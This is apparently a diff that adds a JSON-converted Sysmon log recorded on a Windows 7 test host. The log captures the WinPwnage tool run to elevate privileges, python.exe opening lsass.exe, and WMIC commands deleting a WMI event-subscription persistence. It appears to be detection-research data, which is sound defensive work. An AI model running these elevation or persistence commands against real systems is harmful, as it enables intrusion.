+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:54.762"
+                    },
+                    {
+                        "@Name": "SourceProcessGUID",
+                        "#text": "{365abb72-0d3e-5cd7-0000-0010680e1600}"
+                    },
+                    {
+                        "@Name": "SourceProcessId",
+                        "#text": "1832"
+                    },
+                    {
+                        "@Name": "SourceThreadId",
+                        "#text": "2796"
+                    },
+                    {
+                        "@Name": "SourceImage",
+                        "#text": "c:\\python27\\python.exe"
+                    },
+                    {
+                        "@Name": "TargetProcessGUID",
+                        "#text": "{365abb72-8693-5cd7-0000-0010765e0000}"
+                    },
+                    {
+                        "@Name": "TargetProcessId",
+                        "#text": "492"
+                    },
+                    {
+                        "@Name": "TargetImage",
+                        "#text": "C:\\Windows\\system32\\lsass.exe"
+                    },
+                    {
+                        "@Name": "GrantedAccess",
+                        "#text": "0x00001410"
+                    },
+                    {
+                        "@Name": "CallTrace",
+                        "#text": "C:\\Windows\\SYSTEM32\\ntdll.dll+4591c|C:\\Windows\\system32\\KERNELBASE.dll+8185|c:\\python27\\DLLs\\_ctypes.pyd+ed6a|c:\\python27\\DLLs\\_ctypes.pyd+d9d6|c:\\python27\\DLLs\\_ctypes.pyd+999e|c:\\python27\\DLLs\\_ctypes.pyd+a1ce|c:\\python27\\DLLs\\_ctypes.pyd+5b71|C:\\Windows\\system32\\python27.dll+8f14c|C:\\Windows\\system32\\python27.dll+113384|C:\\Windows\\system32\\python27.dll+112f24|C:\\Windows\\system32\\python27.dll+110c7e|C:\\Windows\\system32\\python27.dll+113001|C:\\Windows\\system32\\python27.dll+112f12|C:\\Windows\\system32\\python27.dll+110c7e|C:\\Windows\\system32\\python27.dll+113001|C:\\Windows\\system32\\python27.dll+112f12"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:54.887533+00:00"
+                },
+                "EventRecordID": "16119",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "2020"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:54.793"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-0d5e-5cd7-0000-0010a1141700}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "2432"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wbem\\WMIC.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "WMI Commandline Utility"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH CommandLineEventConsumer WHERE Name=\"BotConsumer23\" DELETE"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\Downloads\\WinPwnage-master\\WinPwnage-master\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-0807-5cd7-0000-002091450100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000014591"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "High"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-0d3e-5cd7-0000-0010680e1600}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1832"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "python  winpwnage.py -u elevate -i 5 -p c:\\Windows\\System32\\cmd.exe"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "20"
+                },
+                "Version": "3",
+                "Level": "4",
+                "Task": "20",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:54.903160+00:00"
+                },
+                "EventRecordID": "16120",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "4092"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "EventType",
+                        "#text": "WmiConsumerEvent"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:54.903"
+                    },
+                    {
+                        "@Name": "Operation",
+                        "#text": "Deleted"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "Name",
+                        "#text": "\"BotConsumer23\""
+                    },
+                    {
+                        "@Name": "Type",
+                        "#text": "Command Line"
+                    },
+                    {
+                        "@Name": "Destination",
+                        "#text": "\"c:\\\\Windows\\\\System32\\\\cmd.exe\""
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "19"
+                },
+                "Version": "3",
+                "Level": "4",
+                "Task": "19",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:54.981285+00:00"
+                },
+                "EventRecordID": "16121",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "4092"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "EventType",
+                        "#text": "WmiFilterEvent"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:54.981"
+                    },
+                    {
+                        "@Name": "Operation",
+                        "#text": "Deleted"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "EventNamespace",
+                        "#text": "\"root\\\\cimv2\""
+                    },
+                    {
+                        "@Name": "Name",
+                        "#text": "\"BotFilter82\""
+                    },
+                    {
+                        "@Name": "Query",
+                        "#text": "\"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\""
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:55.028160+00:00"
+                },
+                "EventRecordID": "16122",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "2020"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:54.918"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-0d5e-5cd7-0000-0010e6241700}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "4084"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wbem\\WMIC.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "WMI Commandline Utility"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH __EventFilter WHERE Name=\"BotFilter82\" DELETE"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\Downloads\\WinPwnage-master\\WinPwnage-master\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-0807-5cd7-0000-002091450100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000014591"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "High"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-0d3e-5cd7-0000-0010680e1600}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1832"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "python  winpwnage.py -u elevate -i 5 -p c:\\Windows\\System32\\cmd.exe"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "21"
+                },
+                "Version": "3",
+                "Level": "4",
+                "Task": "21",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:55.090658+00:00"
+                },
+                "EventRecordID": "16123",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "4092"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "EventType",
+                        "#text": "WmiBindingEvent"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:55.090"
+                    },
+                    {
+                        "@Name": "Operation",
+                        "#text": "Deleted"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "Consumer",
+                        "#text": "\"CommandLineEventConsumer.Name=\\\"BotConsumer23\\\"\""
+                    },
+                    {
+                        "@Name": "Filter",
+                        "#text": "\"__EventFilter.Name=\\\"BotFilter82\\\"\""
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-11 17:58:55.153160+00:00"
+                },
+                "EventRecordID": "16124",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2032",
+                    "@ThreadID": "2020"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-11 17:58:54.996"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-0d5e-5cd7-0000-001047331700}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3016"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wbem\\WMIC.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "WMI Commandline Utility"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\System32\\wbem\\WMIC.exe\" /namespace:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name=\"BotFilter82\"' DELETE"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\Downloads\\WinPwnage-master\\WinPwnage-master\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-0807-5cd7-0000-002091450100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000014591"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "High"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-0d3e-5cd7-0000-0010680e1600}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1832"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Python27\\python.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "python  winpwnage.py -u elevate -i 5 -p c:\\Windows\\System32\\cmd.exe"
+                    }
+                ]
+            }
+        }
+    }
+]
